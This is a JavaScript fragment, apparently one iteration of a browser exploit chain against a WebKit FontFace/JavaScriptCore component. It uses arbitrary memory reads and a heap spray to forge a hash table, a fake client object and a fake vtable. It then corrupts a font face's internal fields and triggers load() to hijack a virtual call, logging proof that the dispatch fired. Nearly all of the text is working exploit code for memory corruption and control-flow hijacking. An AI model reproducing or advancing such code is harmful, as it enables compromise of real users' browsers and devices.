// V25 Patch: The Returning Dispatch
//
// V24 RESULT (decisive): identical forge, different slot3 -> different failure:
//   slot3=FSG (real fontStateChanged) -> CRASH (the Failure branch's promise path)
//   slot3=BASE+0x4001750 ("noop" RVA)  -> HANG (that RVA is NOT a no-op function)
// => Both runs got PAST cleanup/iteration/Ref and EXECUTED slot3.
//    The dispatch through our forged vtable FIRES. We just need a target
//    that returns cleanly.
//
// V25 FIX: the fake client's promise field (+0x18) is UNPATCHED - it keeps
// the REAL promise pointer from the fbRaw byte-copy. Then fontStateChanged's
// Failure branch either:
//   - isFulfilled(real) == true  -> skips reject entirely, or
//   - isFulfilled(real) == false -> rejects through REAL JSC machinery
// Both paths are safe (real objects). Expected: V25-LOAD-RETURNED.
//
// WITNESS: the chain dumps the real promise (PROXYRAW). V25 re-reads it
// before the craft and after load(); the m_valueOrException region changing
// = fontStateChanged's reject EXECUTED = the dispatch proof in the log.
//
// The "noop" RVA (BASE+0x4001750) is DROPPED - proven to hang, not no-op.

/* ==== V25: THE RETURNING DISPATCH ==== */

try{
  if(MBUF>0n&&VP>0n&&bufs&&bufs.length>0&&fbRaw&&fbRaw.length>=128&&l2raw&&l2raw.length>=128){
    var FSG=BASE+0x5B3D6B0n, NOPG=BASE+0x4001750n;
    var mIdx=-1;
    var tH=readAt(MBUF+0x48n,8); var tV=qAt(tH,0);
    if((tV>>32n)===0xAAn)mIdx=Number(tV&0xFFFFFFFFn);
    bs('V25-TAG-mIdx='+mIdx);

    if(mIdx>=0&&mIdx<32){
      var sv=new DataView(window.__v688.spray[mIdx]);
      var S=MBUF;
      var hitBuf=bufs[0][0];

      var TGT=(function(){var m=/[?&]t=(gadget|poison)/.exec(location.search);return m?m[1]:'gadget';})();
      bs('V25-MODE='+TGT);

      /* ---- STEP 1: ALL readAt FIRST ---- */
      /* the real promise address (from the wrapper copy's +0x18) and a
       * pre-dispatch snapshot of its first 0x30 bytes */
      var promiseAddr=qAt(readAt(FB+0x18n,8),0);
      bs('V25-PROMISE-ADDR='+hex(promiseAddr));
      var promiseBefore=readAt(promiseAddr,0x30);
      bs('V25-PROMISE-BEFORE='+promiseBefore);

      /* sibling face harvest for the Timer */
      bs('V25-SIBLING-SCAN');
      var sib=0n, sibBk=0n;
      for(var sa=FB-0x2000n;sa<FB+0x2000n&&sib===0n;sa+=8n){
        var q0h=readAt(sa,8);
        if(qAt(q0h,0)===VP){
          var bkH=readAt(sa+0x10n,8);
          var bk=qAt(bkH,0);
          if(bk>0x1000000000n&&bk!==S&&bk!==FB&&bk!==self&&bk<0x10000000000n){sib=sa;sibBk=bk;}
        }
      }
      if(sibBk===0n){bs('V25-NO-SIBLING');verd('err','V25 no sibling');throw 'no sibling';}
      bs('V25-SIBLING='+hex(sib)+'-backing='+hex(sibBk));

      var timerH=readAt(sibBk+0x88n,0x38);
      bs('V25-TIMER-BORROWED='+timerH);

      /* ---- STEP 2: build the forge in the marker buffer S ----
       * S+0x00..0x1F : impl  (L2 byte-copy, m_ptr@+0x08 -> S+0x50)
       * S+0x20..0x2F : table metadata {deleted=0, keyCount=1, mask=3, size=4}
       * S+0x30..0x4F : buckets [0]=S(impl), [1..3]=0
       * S+0x50..0x8F : client (fbRaw byte-copy, vtable->S+0x90,
       *                 promise UNPATCHED = the REAL live promise)
       * S+0x90..0xCF : vtable (8 slots, slot3@+0x18 = target)
       */
      bs('V25-FORGE-BUILD');

      for(var ib=0;ib<0x20;ib++)sv.setUint8(ib,parseInt(l2raw.substr(ib*2,2),16));
      dvSetBig(sv,0x08,S+0x50n);                     /* impl m_ptr -> fake client */

      put32(sv,0x20,0);   /* deletedCount = 0 */
      put32(sv,0x24,1);   /* keyCount = 1 */
      put32(sv,0x28,3);   /* tableSizeMask = 3 */
      put32(sv,0x2C,4);   /* tableSize = 4 (shouldShrink: 1*6 < 4 = FALSE) */

      dvSetBig(sv,0x30,S);                            /* bucket[0] = impl */
      dvSetBig(sv,0x38,0n);
      dvSetBig(sv,0x40,0n);
      dvSetBig(sv,0x48,0n);

      for(var cb=0;cb<0x40;cb++)sv.setUint8(0x50+cb,parseInt(fbRaw.substr(cb*2,2),16));
      dvSetBig(sv,0x50+0x00,S+0x90n);                 /* client vtable -> fake */
      /* NOTE: client+0x18 (promise) is DELIBERATELY UNPATCHED - keeps the
       * REAL promise pointer from the fbRaw copy. This is the V25 fix. */
      var clientPromise=dvGetBig(sv,0x50+0x18);
      bs('V25-CLIENT-PROMISE='+hex(clientPromise)+(clientPromise===promiseAddr?'-IS-REAL-OK':'-MISMATCH-NOT-REAL'));

      for(var vs=0;vs<8;vs++)dvSetBig(sv,0x90+vs*8,NOPG);
      if(TGT==='poison')dvSetBig(sv,0x90+0x18,0x4141414141414141n);
      else              dvSetBig(sv,0x90+0x18,FSG);   /* slot3 = the real fontStateChanged */

      bs('V25-FORGE-BUILT-T='+(S+0x30n).toString(16)+'-client='+(S+0x50n).toString(16)+'-vt='+(S+0x90n).toString(16));
      bs('V25-VERIFY-impl-m_ptr='+hex(dvGetBig(sv,0x08)));
      bs('V25-VERIFY-bucket0='+hex(dvGetBig(sv,0x30)));
      bs('V25-VERIFY-client-vt='+hex(dvGetBig(sv,0x50)));
      bs('V25-VERIFY-vt-slot3='+hex(dvGetBig(sv,0x90+0x18)));

      var preA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));

      /* ---- STEP 3: craft the FACE (hitBuf) - all readAt done ---- */
      bs('V25-FACE-CRAFT');
      for(var sz=0x28;sz<=0x47;sz++)hitBuf[sz]=0;      /* sources empty */
      hitBuf[0x82]=0;                                  /* status = Pending */
      hitBuf[0x83]=1;                                  /* sourcesPopulated */
      hitBuf[0x87]=1;                                  /* override = Block */
      for(var bl=0x84;bl<=0x89;bl++)hitBuf[bl]=1;
      for(var tb=0;tb<0x38;tb++)hitBuf[0x88+tb]=parseInt(timerH.substr(tb*2,2),16);
      bs('V25-FACE-VERIFY-status='+hitBuf[0x82]+'-override='+hitBuf[0x87]);

      /* ---- STEP 4: install the table pointer - the LAST write ---- */
      for(var hb=0;hb<8;hb++)hitBuf[0x58+hb]=Number(((S+0x30n)>>BigInt(hb*8))&0xFFn);
      bs('V25-INSTALLED-tblPtr='+hex(S+0x30n));

      /* ---- STEP 5: THE DISPATCH ---- */
      bs('V25-LOAD-PRE');
      var loadReturned=false;
      try{
        faces[zi].load();
        loadReturned=true;
        bs('V25-LOAD-RETURNED');
      }catch(e){
        bs('V25-LOAD-THREW-'+String(e&&e.message?e.message:'?'));
      }

      bs('V25-POST-returned='+loadReturned);
      bs('V25-STATUS-AFTER='+hitBuf[0x82]);
      try{bs('V25-JS-STATUS='+faces[zi].status);}catch(e){bs('V25-JS-STATUS-ERR');}

      /* ---- STEP 6: THE WITNESS - re-read the real promise ---- */
      var promiseAfter=readAt(promiseAddr,0x30);
      bs('V25-PROMISE-AFTER='+promiseAfter);
      if(promiseAfter!==promiseBefore){
        bs('WIT-V25-PROMISE-CHANGED-fontStateChanged-EXECUTED');
      }else{
        bs('WIT-V25-PROMISE-UNCHANGED');
      }

      /* witness diff of the forge buffer (impl/client refcount churn) */
      var curA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));
      var diffs=[];
      for(var wq=0;wq<0x100;wq+=8){
        var cur=0n,old=0n;
        for(var wb=0;wb<8;wb++){
          cur|=BigInt(curA[wq+wb])<<BigInt(wb*8);
          old|=BigInt(preA[wq+wb])<<BigInt(wb*8);
        }
        if(cur!==old)diffs.push('@'+(S+BigInt(wq)).toString(16)+':'+old.toString(16)+'>'+cur.toString(16));
      }
      if(diffs.length)bs('WIT-V25-FORGE-WRITE-'+diffs.slice(0,10).join('|'));
      else bs('WIT-V25-FORGE-nowrite');

      /* restore */
      for(var rb=0;rb<8;rb++)hitBuf[0x58+rb]=Number((L1>>BigInt(rb*8))&0xFFn);
      bs('V25-RESTORED');

      if(loadReturned){
        verd('ok','V25 '+TGT+' load() RETURNED - DISPATCH SURVIVED');
        bs('V25-DONE-'+TGT+'-RETURNED');
      }else{
        verd('err','V25 '+TGT+' crashed');
        bs('V25-DONE-'+TGT+'-CRASHED');
      }

    }else bs('V25-SKIP-bad-idx');
  }else bs('V25-SKIP-missing-data');
}catch(e25){bs('V25-ERR-'+String(e25&&e25.message?e25.message:'?'));}
/* ==== V25 END ==== */
